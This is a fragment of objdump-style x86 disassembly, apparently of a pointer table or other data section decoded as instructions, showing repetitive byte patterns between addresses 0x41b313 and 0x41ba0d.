  41b313:	inc    ecx
  41b314:	add    BYTE PTR [edx+eiz*8+0x41],al
  41b318:	add    BYTE PTR [eax-0x1e],cl
  41b31b:	inc    ecx
  41b31c:	add    BYTE PTR [edx+eiz*8+0x41],cl
  41b320:	add    BYTE PTR [eax-0x1e],dl
  41b323:	inc    ecx
  41b324:	add    BYTE PTR [edx+eiz*8+0x41],dl
  41b328:	add    BYTE PTR [eax-0x1f],dh
  41b32b:	inc    ecx
  41b32c:	add    BYTE PTR [eax-0x1e],bl
  41b32f:	inc    ecx
  41b330:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41b334:	add    BYTE PTR [eax-0x1e],ah
  41b337:	inc    ecx
  41b338:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41b33c:	add    BYTE PTR [eax-0x1e],ch
  41b33f:	inc    ecx
  41b340:	add    BYTE PTR [edx+eiz*8+0x41],ch
  41b344:	add    BYTE PTR [eax-0x1e],dh
  41b347:	inc    ecx
  41b348:	add    BYTE PTR [eax],cl
  41b34a:	loope  0x41b38d
  41b34c:	add    BYTE PTR [eax],ch
  41b34e:	loope  0x41b391
  41b350:	add    BYTE PTR [edx+eiz*8],ah
  41b353:	inc    ecx
  41b354:	add    BYTE PTR [edx+eiz*8+0x41],dh
  41b358:	add    BYTE PTR [eax-0x1e],bh
  41b35b:	inc    ecx
  41b35c:	add    BYTE PTR [edx+eiz*8+0x41],bh
  41b360:	add    BYTE PTR [eax-0x1e],al
  41b363:	inc    ecx
  41b364:	add    BYTE PTR [eax-0x7bffbe1e],al
  41b36a:	loop   0x41b3ad
  41b36c:	add    BYTE PTR [eax+0x200041e2],cl
  41b372:	loop   0x41b3b5
  41b374:	add    BYTE PTR [edx+eiz*8-0x1d6fffbf],cl
  41b37b:	inc    ecx
  41b37c:	add    BYTE PTR [edx+eiz*8-0x1d67ffbf],dl
  41b383:	inc    ecx
  41b384:	add    BYTE PTR [edx+eiz*8-0x1edfffbf],bl
  41b38b:	inc    ecx
  41b38c:	add    BYTE PTR [eax-0xbffbe1e],ah
  41b392:	loopne 0x41b3d5
  41b394:	add    BYTE PTR [eax-0x1f],al
  41b397:	inc    ecx
  41b398:	add    BYTE PTR [edx+eiz*8-0x1df7ffbf],ah
  41b39f:	inc    ecx
  41b3a0:	add    ah,ch
  41b3a2:	loopne 0x41b3e5
  41b3a4:	add    BYTE PTR [eax],dh
  41b3a6:	loop   0x41b3e9
  41b3a8:	add    BYTE PTR [eax-0x1f],bh
  41b3ab:	inc    ecx
  41b3ac:	add    BYTE PTR [eax-0x53ffbe1e],ch
  41b3b2:	loop   0x41b3f5
  41b3b4:	add    BYTE PTR [eax-0x53ffbe1e],dh
  41b3ba:	loope  0x41b3fd
  41b3bc:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41b3c0:	add    BYTE PTR [edx+eiz*8-0x1d47ffbf],dh
  41b3c7:	inc    ecx
  41b3c8:	add    BYTE PTR [edx+eiz*8-0x1d9bffbf],bh
  41b3cf:	inc    ecx
  41b3d0:	add    al,al
  41b3d2:	loop   0x41b415
  41b3d4:	add    ah,ch
  41b3d6:	loope  0x41b419
  41b3d8:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41b3dc:	add    BYTE PTR [eax],al
  41b3de:	loope  0x41b421
  41b3e0:	add    ah,al
  41b3e2:	loop   0x41b425
  41b3e4:	add    al,cl
  41b3e6:	loop   0x41b429
  41b3e8:	add    ah,cl
  41b3ea:	loop   0x41b42d
  41b3ec:	add    al,dl
  41b3ee:	loop   0x41b431
  41b3f0:	add    ah,dl
  41b3f2:	loop   0x41b435
  41b3f4:	add    al,bl
  41b3f6:	loop   0x41b439
  41b3f8:	add    ah,bl
  41b3fa:	loop   0x41b43d
  41b3fc:	add    BYTE PTR [eax+0x680041e2],cl
  41b402:	loope  0x41b445
  41b404:	add    al,ah
  41b406:	loop   0x41b449
  41b408:	add    ah,ah
  41b40a:	loop   0x41b44d
  41b40c:	add    BYTE PTR [eax],cl
  41b40e:	loope  0x41b451
  41b410:	add    al,al
  41b412:	loop   0x41b455
  41b414:	add    al,ch
  41b416:	loop   0x41b459
  41b418:	add    ah,ch
  41b41a:	loop   0x41b45d
  41b41c:	add    BYTE PTR [eax],bl
  41b41e:	loope  0x41b461
  41b420:	add    al,dh
  41b422:	loop   0x41b465
  41b424:	add    ah,ah
  41b426:	loope  0x41b469
  41b428:	add    ah,ch
  41b42a:	loope  0x41b46d
  41b42c:	add    ah,dh
  41b42e:	loop   0x41b471
  41b430:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41b434:	add    ah,bh
  41b436:	loope  0x41b479
  41b438:	add    BYTE PTR [eax],ch
  41b43a:	loop   0x41b47d
  41b43c:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41b440:	add    BYTE PTR [eax-0x4fffbe1e],dh
  41b446:	loope  0x41b489
  41b448:	add    al,bh
  41b44a:	loop   0x41b48d
  41b44c:	add    BYTE PTR [edx+eiz*8-0x1d03ffbf],dh
  41b453:	inc    ecx
  41b454:	add    BYTE PTR [eax],al
  41b456:	jecxz  0x41b499
  41b458:	add    BYTE PTR [ecx+eiz*8-0x1cfbffbf],bh
  41b45f:	inc    ecx
  41b460:	add    al,bh
  41b462:	loop   0x41b4a5
  41b464:	add    ah,bh
  41b466:	loope  0x41b4a9
  41b468:	add    BYTE PTR [eax],cl
  41b46a:	jecxz  0x41b4ad
  41b46c:	add    BYTE PTR [ebx+eiz*8],cl
  41b46f:	inc    ecx
  41b470:	add    BYTE PTR [eax],dl
  41b472:	jecxz  0x41b4b5
  41b474:	add    BYTE PTR [eax+0x140041e2],bl
  41b47a:	jecxz  0x41b4bd
  41b47c:	add    BYTE PTR [ebx+eiz*8],cl
  41b47f:	inc    ecx
  41b480:	add    BYTE PTR [edx+eiz*8+0x41],ch
  41b484:	add    BYTE PTR [edx+eiz*8-0x1ce7ffbf],dl
  41b48b:	inc    ecx
  41b48c:	add    BYTE PTR [ebx+eiz*8],bl
  41b48f:	inc    ecx
  41b490:	add    ah,cl
  41b492:	loope  0x41b4d5
  41b494:	add    BYTE PTR [eax],ah
  41b496:	jecxz  0x41b4d9
  41b498:	add    BYTE PTR [ebx+eiz*8],ah
  41b49b:	inc    ecx
  41b49c:	add    BYTE PTR [eax],ch
  41b49e:	jecxz  0x41b4e1
  41b4a0:	add    BYTE PTR [ebx+eiz*8],ch
  41b4a3:	inc    ecx
  41b4a4:	add    BYTE PTR [eax],dh
  41b4a6:	jecxz  0x41b4e9
  41b4a8:	add    ah,cl
  41b4aa:	loop   0x41b4ed
  41b4ac:	add    ah,dh
  41b4ae:	loope  0x41b4f1
  41b4b0:	add    BYTE PTR [ebx+eiz*8],dh
  41b4b3:	inc    ecx
  41b4b4:	add    BYTE PTR [eax],bh
  41b4b6:	jecxz  0x41b4f9
  41b4b8:	add    BYTE PTR [ebx+eiz*8],bh
  41b4bb:	inc    ecx
  41b4bc:	add    BYTE PTR [eax-0x1d],al
  41b4bf:	inc    ecx
  41b4c0:	add    BYTE PTR [ebx+eiz*8+0x41],al
  41b4c4:	add    ah,al
  41b4c6:	loope  0x41b509
  41b4c8:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41b4cc:	add    BYTE PTR [edx+eiz*8-0x1d47ffbf],ah
  41b4d3:	inc    ecx
  41b4d4:	add    BYTE PTR [eax],ah
  41b4d6:	loope  0x41b519
  41b4d8:	add    BYTE PTR [edx+eiz*8-0x1cb7ffbf],bl
  41b4df:	inc    ecx
  41b4e0:	add    BYTE PTR [ebx+eiz*8+0x41],cl
  41b4e4:	add    BYTE PTR [eax-0x1d],dl
  41b4e7:	inc    ecx
  41b4e8:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41b4ec:	add    BYTE PTR [eax-0x1e],ch
  41b4ef:	inc    ecx
  41b4f0:	add    BYTE PTR [ebx+eiz*8+0x41],dl
  41b4f4:	add    BYTE PTR [ecx+eiz*8-0x1e3fffbf],ch
  41b4fb:	inc    ecx
  41b4fc:	add    ah,dh
  41b4fe:	loopne 0x41b541
  41b500:	add    BYTE PTR [eax-0x1d],bl
  41b503:	inc    ecx
  41b504:	add    BYTE PTR [ecx+eiz*8],ch
  41b507:	inc    ecx
  41b508:	add    BYTE PTR [ebx+eiz*8+0x41],bl
  41b50c:	add    BYTE PTR [eax-0x1d],ah
  41b50f:	inc    ecx
  41b510:	add    BYTE PTR [ebx+eiz*8+0x41],ah
  41b514:	add    BYTE PTR [eax+0x680041e2],ah
  41b51a:	jecxz  0x41b55d
  41b51c:	add    BYTE PTR [ebx+eiz*8+0x41],ch
  41b520:	add    BYTE PTR [eax-0x1d],dh
  41b523:	inc    ecx
  41b524:	add    BYTE PTR [ebx+eiz*8+0x41],dh
  41b528:	add    BYTE PTR [ecx+eiz*8-0x1c97ffbf],ah
  41b52f:	inc    ecx
  41b530:	add    BYTE PTR [eax-0x1d],bh
  41b533:	inc    ecx
  41b534:	add    BYTE PTR [ebx+eiz*8+0x41],bh
  41b538:	add    BYTE PTR [eax-0x1d],ch
  41b53b:	inc    ecx
  41b53c:	add    BYTE PTR [eax+0x500041e1],ah
  41b542:	loop   0x41b585
  41b544:	add    al,bl
  41b546:	loop   0x41b589
  41b548:	add    al,al
  41b54a:	loope  0x41b58d
  41b54c:	add    al,ah
  41b54e:	loop   0x41b591
  41b550:	add    BYTE PTR [eax-0x7bffbe1d],al
  41b556:	jecxz  0x41b599
  41b558:	add    BYTE PTR [eax-0x43ffbe1f],al
  41b55e:	loop   0x41b5a1
  41b560:	add    BYTE PTR [eax+0x300041e3],cl
  41b566:	loope  0x41b5a9
  41b568:	add    BYTE PTR [eax-0x1f],bh
  41b56b:	inc    ecx
  41b56c:	add    BYTE PTR [edx+eiz*8-0x1c73ffbf],dl
  41b573:	inc    ecx
  41b574:	add    BYTE PTR [eax-0x27ffbe1d],dl
  41b57a:	loope  0x41b5bd
  41b57c:	add    BYTE PTR [ebx+eiz*8-0x1eefffbf],dl
  41b583:	inc    ecx
  41b584:	add    BYTE PTR [ecx+eiz*8+0x41],bh
  41b588:	add    BYTE PTR [eax+0x680041e3],bl
  41b58e:	loop   0x41b5d1
  41b590:	add    BYTE PTR [ebx+eiz*8-0x1e73ffbf],bl
  41b597:	inc    ecx
  41b598:	add    BYTE PTR [eax+0xc0041e3],ah
  41b59e:	loope  0x41b5e1
  41b5a0:	add    BYTE PTR [ebx+eiz*8-0x1d53ffbf],ah
  41b5a7:	inc    ecx
  41b5a8:	add    BYTE PTR [eax-0x53ffbe1d],ch
  41b5ae:	jecxz  0x41b5f1
  41b5b0:	add    BYTE PTR [ecx+eiz*8-0x1e47ffbf],ah
  41b5b7:	inc    ecx
  41b5b8:	add    BYTE PTR [ecx+eiz*8],ch
  41b5bb:	inc    ecx
  41b5bc:	add    BYTE PTR [eax-0x1d],al
  41b5bf:	inc    ecx
  41b5c0:	add    BYTE PTR [eax-0x4fffbe1f],al
  41b5c6:	jecxz  0x41b609
  41b5c8:	add    BYTE PTR [ebx+eiz*8-0x1cabffbf],dh
  41b5cf:	inc    ecx
  41b5d0:	add    ah,bl
  41b5d2:	loop   0x41b615
  41b5d4:	add    BYTE PTR [edx+eiz*8+0x41],al
  41b5d8:	add    al,ah
  41b5da:	loope  0x41b61d
  41b5dc:	add    BYTE PTR [ebx+eiz*8],ah
  41b5df:	inc    ecx
  41b5e0:	add    BYTE PTR [eax-0x1e],bh
  41b5e3:	inc    ecx
  41b5e4:	add    BYTE PTR [eax+0x5c0041e3],bh
  41b5ea:	jecxz  0x41b62d
  41b5ec:	add    BYTE PTR [eax],dh
  41b5ee:	loop   0x41b631
  41b5f0:	add    BYTE PTR [eax-0x43ffbe1d],ch
  41b5f6:	jecxz  0x41b639
  41b5f8:	add    BYTE PTR [eax+0x200041e2],ah
  41b5fe:	loope  0x41b641
  41b600:	add    BYTE PTR [eax-0x1e],dl
  41b603:	inc    ecx
  41b604:	add    al,al
  41b606:	jecxz  0x41b649
  41b608:	add    ah,al
  41b60a:	jecxz  0x41b64d
  41b60c:	add    ah,dh
  41b60e:	loope  0x41b651
  41b610:	add    BYTE PTR [eax-0x37ffbe1d],al
  41b616:	jecxz  0x41b659
  41b618:	add    ah,cl
  41b61a:	jecxz  0x41b65d
  41b61c:	add    BYTE PTR [edx+eiz*8-0x1c2fffbf],bl
  41b623:	inc    ecx
  41b624:	add    ah,dl
  41b626:	jecxz  0x41b669
  41b628:	add    BYTE PTR [edx+eiz*8-0x1e4bffbf],bh
  41b62f:	inc    ecx
  41b630:	add    BYTE PTR [eax],cl
  41b632:	fld    QWORD PTR [ecx+0x0]
  41b635:	or     al,0xdd
  41b637:	inc    ecx
  41b638:	add    BYTE PTR [eax],dl
  41b63a:	fld    QWORD PTR [ecx+0x0]
  41b63d:	adc    al,0xdd
  41b63f:	inc    ecx
  41b640:	add    BYTE PTR [eax],bl
  41b642:	fld    QWORD PTR [ecx+0x0]
  41b645:	sbb    al,0xdd
  41b647:	inc    ecx
  41b648:	add    BYTE PTR [eax],ah
  41b64a:	fld    QWORD PTR [ecx+0x0]
  41b64d:	and    al,0xdd
  41b64f:	inc    ecx
  41b650:	add    BYTE PTR [eax],ch
  41b652:	fld    QWORD PTR [ecx+0x0]
  41b655:	sub    al,0xdd
  41b657:	inc    ecx
  41b658:	add    BYTE PTR [eax],dh
  41b65a:	fld    QWORD PTR [ecx+0x0]
  41b65d:	xor    al,0xdd
  41b65f:	inc    ecx
  41b660:	add    BYTE PTR [eax],bh
  41b662:	fld    QWORD PTR [ecx+0x0]
  41b665:	cmp    al,0xdd
  41b667:	inc    ecx
  41b668:	add    BYTE PTR [eax-0x23],al
  41b66b:	inc    ecx
  41b66c:	add    BYTE PTR [ebp+ebx*8+0x41],al
  41b670:	add    BYTE PTR [eax-0x23],cl
  41b673:	inc    ecx
  41b674:	add    BYTE PTR [ebp+ebx*8+0x41],cl
  41b678:	add    BYTE PTR [eax-0x23],dl
  41b67b:	inc    ecx
  41b67c:	add    BYTE PTR [ebp+ebx*8+0x41],dl
  41b680:	add    BYTE PTR [eax-0x23],bl
  41b683:	inc    ecx
  41b684:	add    BYTE PTR [ebp+ebx*8+0x41],bl
  41b688:	add    BYTE PTR [eax-0x23],ah
  41b68b:	inc    ecx
  41b68c:	add    BYTE PTR [ebp+ebx*8+0x41],ah
  41b690:	add    BYTE PTR [eax-0x23],ch
  41b693:	inc    ecx
  41b694:	add    BYTE PTR [ebp+ebx*8+0x41],ch
  41b698:	add    BYTE PTR [eax-0x23],dh
  41b69b:	inc    ecx
  41b69c:	add    BYTE PTR [ebp+ebx*8+0x41],dh
  41b6a0:	add    BYTE PTR [eax-0x23],bh
  41b6a3:	inc    ecx
  41b6a4:	add    BYTE PTR [ebp+ebx*8+0x41],bh
  41b6a8:	add    BYTE PTR [eax-0x7bffbe23],al
  41b6ae:	fld    QWORD PTR [ecx+0x0]
  41b6b1:	mov    ch,bl
  41b6b3:	inc    ecx
  41b6b4:	add    BYTE PTR [ebp+ebx*8-0x226fffbf],cl
  41b6bb:	inc    ecx
  41b6bc:	add    BYTE PTR [ebp+ebx*8-0x2267ffbf],dl
  41b6c3:	inc    ecx
  41b6c4:	add    BYTE PTR [ebp+ebx*8-0x225fffbf],bl
  41b6cb:	inc    ecx
  41b6cc:	add    BYTE PTR [ebp+ebx*8-0x2257ffbf],ah
  41b6d3:	inc    ecx
  41b6d4:	add    BYTE PTR [ebp+ebx*8-0x224fffbf],ch
  41b6db:	inc    ecx
  41b6dc:	add    BYTE PTR [ebp+ebx*8-0x2247ffbf],dh
  41b6e3:	inc    ecx
  41b6e4:	add    BYTE PTR [ebp+ebx*8-0x223fffbf],bh
  41b6eb:	inc    ecx
  41b6ec:	add    BYTE PTR [ebp+ebx*8-0x223bffbf],bl
  41b6f3:	inc    ecx
  41b6f4:	add    al,cl
  41b6f6:	fld    QWORD PTR [ecx+0x0]
  41b6f9:	int3   
  41b6fa:	fld    QWORD PTR [ecx+0x0]
  41b6fd:	rcr    ch,1
  41b6ff:	inc    ecx
  41b700:	add    ah,dl
  41b702:	fld    QWORD PTR [ecx+0x0]
  41b705:	mov    al,0xdd
  41b707:	inc    ecx
  41b708:	add    al,bl
  41b70a:	fld    QWORD PTR [ecx+0x0]
  41b70d:	(bad)  
  41b70f:	inc    ecx
  41b710:	add    al,ah
  41b712:	fld    QWORD PTR [ecx+0x0]
  41b715:	in     al,0xdd
  41b717:	inc    ecx
  41b718:	add    al,ch
  41b71a:	fld    QWORD PTR [ecx+0x0]
  41b71d:	in     al,dx
  41b71e:	fld    QWORD PTR [ecx+0x0]
  41b721:	lock fld QWORD PTR [ecx+0x0]
  41b725:	hlt    
  41b726:	fld    QWORD PTR [ecx+0x0]
  41b729:	clc    
  41b72a:	fld    QWORD PTR [ecx+0x0]
  41b72d:	cld    
  41b72e:	fld    QWORD PTR [ecx+0x0]
  41b731:	add    dh,bl
  41b733:	inc    ecx
  41b734:	add    BYTE PTR [esi+ebx*8],al
  41b737:	inc    ecx
  41b738:	add    BYTE PTR [eax],cl
  41b73a:	fiadd  WORD PTR [ecx+0x0]
  41b73d:	or     al,0xde
  41b73f:	inc    ecx
  41b740:	add    BYTE PTR [eax],dl
  41b742:	fiadd  WORD PTR [ecx+0x0]
  41b745:	adc    al,0xde
  41b747:	inc    ecx
  41b748:	add    BYTE PTR [eax],bl
  41b74a:	fiadd  WORD PTR [ecx+0x0]
  41b74d:	sbb    al,0xde
  41b74f:	inc    ecx
  41b750:	add    BYTE PTR [eax],ah
  41b752:	fiadd  WORD PTR [ecx+0x0]
  41b755:	and    al,0xde
  41b757:	inc    ecx
  41b758:	add    BYTE PTR [eax],ch
  41b75a:	fiadd  WORD PTR [ecx+0x0]
  41b75d:	sub    al,0xde
  41b75f:	inc    ecx
  41b760:	add    BYTE PTR [eax],dh
  41b762:	fiadd  WORD PTR [ecx+0x0]
  41b765:	xor    al,0xde
  41b767:	inc    ecx
  41b768:	add    BYTE PTR [eax],bh
  41b76a:	fiadd  WORD PTR [ecx+0x0]
  41b76d:	adc    dh,bl
  41b76f:	inc    ecx
  41b770:	add    BYTE PTR [esi+ebx*8],bh
  41b773:	inc    ecx
  41b774:	add    BYTE PTR [esi+ebx*8],ah
  41b777:	inc    ecx
  41b778:	add    BYTE PTR [eax-0x22],al
  41b77b:	inc    ecx
  41b77c:	add    al,bl
  41b77e:	fld    QWORD PTR [ecx+0x0]
  41b781:	inc    esp
  41b782:	fiadd  WORD PTR [ecx+0x0]
  41b785:	dec    eax
  41b786:	fiadd  WORD PTR [ecx+0x0]
  41b789:	dec    esp
  41b78a:	fiadd  WORD PTR [ecx+0x0]
  41b78d:	push   eax
  41b78e:	fiadd  WORD PTR [ecx+0x0]
  41b791:	push   esp
  41b792:	fiadd  WORD PTR [ecx+0x0]
  41b795:	pop    eax
  41b796:	fiadd  WORD PTR [ecx+0x0]
  41b799:	pop    esp
  41b79a:	fiadd  WORD PTR [ecx+0x0]
  41b79d:	adc    al,0xde
  41b79f:	inc    ecx
  41b7a0:	add    BYTE PTR [eax-0x22],ah
  41b7a3:	inc    ecx
  41b7a4:	add    BYTE PTR [esi+ebx*8+0x41],ah
  41b7a8:	add    BYTE PTR [eax-0x22],ch
  41b7ab:	inc    ecx
  41b7ac:	add    BYTE PTR [esi+ebx*8+0x41],ch
  41b7b0:	add    BYTE PTR [eax-0x22],dh
  41b7b3:	inc    ecx
  41b7b4:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41b7b8:	add    BYTE PTR [eax-0x22],bh
  41b7bb:	inc    ecx
  41b7bc:	add    BYTE PTR [esi+ebx*8+0x41],bh
  41b7c0:	add    BYTE PTR [eax-0x7bffbe22],al
  41b7c6:	fiadd  WORD PTR [ecx+0x0]
  41b7c9:	or     al,0xde
  41b7cb:	inc    ecx
  41b7cc:	add    BYTE PTR [eax-0x73ffbe22],cl
  41b7d2:	fiadd  WORD PTR [ecx+0x0]
  41b7d5:	nop
  41b7d6:	fiadd  WORD PTR [ecx+0x0]
  41b7d9:	sbb    ch,bl
  41b7db:	inc    ecx
  41b7dc:	add    BYTE PTR [esi+ebx*8-0x224fffbf],dl
  41b7e3:	inc    ecx
  41b7e4:	add    BYTE PTR [ebp+ebx*8-0x2167ffbf],dh
  41b7eb:	inc    ecx
  41b7ec:	add    BYTE PTR [esi+ebx*8-0x21afffbf],bl
  41b7f3:	inc    ecx
  41b7f4:	add    BYTE PTR [eax-0x5bffbe22],ah
  41b7fa:	fiadd  WORD PTR [ecx+0x0]
  41b7fd:	test   al,0xde
  41b7ff:	inc    ecx
  41b800:	add    BYTE PTR [esi+ebx*8-0x214fffbf],ch
  41b807:	inc    ecx
  41b808:	add    BYTE PTR [esi+ebx*8-0x214bffbf],cl
  41b80f:	inc    ecx
  41b810:	add    BYTE PTR [eax-0x43ffbe22],bh
  41b816:	fiadd  WORD PTR [ecx+0x0]
  41b819:	rcr    dh,0x41
  41b81c:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41b820:	add    ah,al
  41b822:	fiadd  WORD PTR [ecx+0x0]
  41b825:	enter  0x41de,0x0
  41b829:	int3   
  41b82a:	fiadd  WORD PTR [ecx+0x0]
  41b82d:	rcr    dh,1
  41b82f:	inc    ecx
  41b830:	add    ah,dl
  41b832:	fiadd  WORD PTR [ecx+0x0]
  41b835:	fcomp  st(6)
  41b837:	inc    ecx
  41b838:	add    ah,bl
  41b83a:	fiadd  WORD PTR [ecx+0x0]
  41b83d:	loopne 0x41b81d
  41b83f:	inc    ecx
  41b840:	add    ah,ah
  41b842:	fiadd  WORD PTR [ecx+0x0]
  41b845:	jo     0x41b825
  41b847:	inc    ecx
  41b848:	add    al,ch
  41b84a:	fiadd  WORD PTR [ecx+0x0]
  41b84d:	in     al,dx
  41b84e:	fiadd  WORD PTR [ecx+0x0]
  41b851:	lock fiadd WORD PTR [ecx+0x0]
  41b855:	hlt    
  41b856:	fiadd  WORD PTR [ecx+0x0]
  41b859:	clc    
  41b85a:	fiadd  WORD PTR [ecx+0x0]
  41b85d:	cld    
  41b85e:	fiadd  WORD PTR [ecx+0x0]
  41b861:	add    bh,bl
  41b863:	inc    ecx
  41b864:	add    BYTE PTR [edi+ebx*8],al
  41b867:	inc    ecx
  41b868:	add    BYTE PTR [eax],cl
  41b86a:	fild   WORD PTR [ecx+0x0]
  41b86d:	or     al,0xdf
  41b86f:	inc    ecx
  41b870:	add    al,bl
  41b872:	fld    QWORD PTR [ecx+0x0]
  41b875:	adc    bh,bl
  41b877:	inc    ecx
  41b878:	add    BYTE PTR [edi+ebx*8],dl
  41b87b:	inc    ecx
  41b87c:	add    BYTE PTR [eax],bl
  41b87e:	fild   WORD PTR [ecx+0x0]
  41b881:	sbb    al,0xdf
  41b883:	inc    ecx
  41b884:	add    BYTE PTR [eax],ah
  41b886:	fild   WORD PTR [ecx+0x0]
  41b889:	and    al,0xdf
  41b88b:	inc    ecx
  41b88c:	add    BYTE PTR [eax],ch
  41b88e:	fild   WORD PTR [ecx+0x0]
  41b891:	sub    al,0xdf
  41b893:	inc    ecx
  41b894:	add    BYTE PTR [eax],ah
  41b896:	fiadd  WORD PTR [ecx+0x0]
  41b899:	xor    bh,bl
  41b89b:	inc    ecx
  41b89c:	add    BYTE PTR [edi+ebx*8],dh
  41b89f:	inc    ecx
  41b8a0:	add    BYTE PTR [eax],bh
  41b8a2:	fild   WORD PTR [ecx+0x0]
  41b8a5:	cmp    al,0xdf
  41b8a7:	inc    ecx
  41b8a8:	add    BYTE PTR [eax-0x21],al
  41b8ab:	inc    ecx
  41b8ac:	add    BYTE PTR [esi+ebx*8-0x20bbffbf],dl
  41b8b3:	inc    ecx
  41b8b4:	add    BYTE PTR [eax-0x22],al
  41b8b7:	inc    ecx
  41b8b8:	add    BYTE PTR [eax-0x21],cl
  41b8bb:	inc    ecx
  41b8bc:	add    BYTE PTR [eax+0xc0041dd],ch
  41b8c2:	fild   WORD PTR [ecx+0x0]
  41b8c5:	dec    esp
  41b8c6:	fild   WORD PTR [ecx+0x0]
  41b8c9:	push   eax
  41b8ca:	fild   WORD PTR [ecx+0x0]
  41b8cd:	push   esp
  41b8ce:	fild   WORD PTR [ecx+0x0]
  41b8d1:	xor    ch,bl
  41b8d3:	inc    ecx
  41b8d4:	add    BYTE PTR [eax-0x21],bl
  41b8d7:	inc    ecx
  41b8d8:	add    BYTE PTR [edi+ebx*8+0x41],bl
  41b8dc:	add    BYTE PTR [eax-0x21],ah
  41b8df:	inc    ecx
  41b8e0:	add    BYTE PTR [ebp+ebx*8-0x209bffbf],al
  41b8e7:	inc    ecx
  41b8e8:	add    BYTE PTR [eax-0x21],ch
  41b8eb:	inc    ecx
  41b8ec:	add    BYTE PTR [edi+ebx*8+0x41],ch
  41b8f0:	add    BYTE PTR [eax-0x21],dh
  41b8f3:	inc    ecx
  41b8f4:	add    BYTE PTR [edi+ebx*8+0x41],dh
  41b8f8:	add    BYTE PTR [eax],ch
  41b8fa:	fld    QWORD PTR [ecx+0x0]
  41b8fd:	js     0x41b8de
  41b8ff:	inc    ecx
  41b900:	add    BYTE PTR [edi+ebx*8+0x41],bh
  41b904:	add    BYTE PTR [eax-0x7bffbe21],al
  41b90a:	fild   WORD PTR [ecx+0x0]
  41b90d:	mov    bh,bl
  41b90f:	inc    ecx
  41b910:	add    BYTE PTR [edi+ebx*8-0x206fffbf],cl
  41b917:	inc    ecx
  41b918:	add    BYTE PTR [edi+ebx*8-0x2067ffbf],dl
  41b91f:	inc    ecx
  41b920:	add    BYTE PTR [edi+ebx*8-0x205fffbf],bl
  41b927:	inc    ecx
  41b928:	add    BYTE PTR [edi+ebx*8-0x2057ffbf],ah
  41b92f:	inc    ecx
  41b930:	add    BYTE PTR [edi+ebx*8-0x22e3ffbf],ch
  41b937:	inc    ecx
  41b938:	add    BYTE PTR [eax-0x4bffbe21],dh
  41b93e:	fild   WORD PTR [ecx+0x0]
  41b941:	and    dh,bl
  41b943:	inc    ecx
  41b944:	add    BYTE PTR [eax-0x43ffbe21],bh
  41b94a:	fild   WORD PTR [ecx+0x0]
  41b94d:	je     0x41b92e
  41b94f:	inc    ecx
  41b950:	add    al,al
  41b952:	fild   WORD PTR [ecx+0x0]
  41b955:	(bad)  
  41b956:	fild   WORD PTR [ecx+0x0]
  41b959:	enter  0x41df,0x0
  41b95d:	and    bh,bl
  41b95f:	inc    ecx
  41b960:	add    ah,cl
  41b962:	fild   WORD PTR [ecx+0x0]
  41b965:	rcr    bh,1
  41b967:	inc    ecx
  41b968:	add    ah,dl
  41b96a:	fild   WORD PTR [ecx+0x0]
  41b96d:	fcomp  st(7)
  41b96f:	inc    ecx
  41b970:	add    ah,al
  41b972:	fild   WORD PTR [ecx+0x0]
  41b975:	xchg   esp,eax
  41b976:	fiadd  WORD PTR [ecx+0x0]
  41b979:	(bad)  
  41b97b:	inc    ecx
  41b97c:	add    al,ah
  41b97e:	fild   WORD PTR [ecx+0x0]
  41b981:	in     al,0xdf
  41b983:	inc    ecx
  41b984:	add    al,ch
  41b986:	fild   WORD PTR [ecx+0x0]
  41b989:	clc    
  41b98a:	fld    QWORD PTR [ecx+0x0]
  41b98d:	jo     0x41b96c
  41b98f:	inc    ecx
  41b990:	add    ah,ch
  41b992:	fild   WORD PTR [ecx+0x0]
  41b995:	lock fild WORD PTR [ecx+0x0]
  41b999:	hlt    
  41b99a:	fild   WORD PTR [ecx+0x0]
  41b99d:	pushf  
  41b99e:	fld    QWORD PTR [ecx+0x0]
  41b9a1:	clc    
  41b9a2:	fild   WORD PTR [ecx+0x0]
  41b9a5:	cld    
  41b9a6:	fild   WORD PTR [ecx+0x0]
  41b9a9:	(bad)  
  41b9ab:	inc    ecx
  41b9ac:	add    BYTE PTR [eax],al
  41b9ae:	loopne 0x41b9f1
  41b9b0:	add    BYTE PTR [eax+eiz*8],al
  41b9b3:	inc    ecx
  41b9b4:	add    BYTE PTR [eax],cl
  41b9b6:	loopne 0x41b9f9
  41b9b8:	add    BYTE PTR [eax-0x23],dh
  41b9bb:	inc    ecx
  41b9bc:	add    BYTE PTR [eax+eiz*8],cl
  41b9bf:	inc    ecx
  41b9c0:	add    al,dl
  41b9c2:	fld    QWORD PTR [ecx+0x0]
  41b9c5:	adc    al,ah
  41b9c7:	inc    ecx
  41b9c8:	add    BYTE PTR [eax+eiz*8],dl
  41b9cb:	inc    ecx
  41b9cc:	add    BYTE PTR [eax],bl
  41b9ce:	loopne 0x41ba11
  41b9d0:	add    BYTE PTR [eax+eiz*8],bl
  41b9d3:	inc    ecx
  41b9d4:	add    BYTE PTR [eax],ah
  41b9d6:	loopne 0x41ba19
  41b9d8:	add    BYTE PTR [eax+eiz*8],ah
  41b9db:	inc    ecx
  41b9dc:	add    BYTE PTR [ebx*8-0x2003ffbf],cl
  41b9e3:	inc    ecx
  41b9e4:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41b9e8:	add    BYTE PTR [eax],ch
  41b9ea:	loopne 0x41ba2d
  41b9ec:	add    BYTE PTR [eax+eiz*8],ch
  41b9ef:	inc    ecx
  41b9f0:	add    BYTE PTR [eax],dh
  41b9f2:	loopne 0x41ba35
  41b9f4:	add    BYTE PTR [eax+eiz*8],dh
  41b9f7:	inc    ecx
  41b9f8:	add    BYTE PTR [eax],bh
  41b9fa:	loopne 0x41ba3d
  41b9fc:	add    BYTE PTR [eax+eiz*8],bh
  41b9ff:	inc    ecx
  41ba00:	add    BYTE PTR [eax-0x20],al
  41ba03:	inc    ecx
  41ba04:	add    BYTE PTR [eax+eiz*8+0x41],al
  41ba08:	add    BYTE PTR [eax],cl
  41ba0a:	fld    QWORD PTR [ecx+0x0]
  41ba0d:	dec    eax
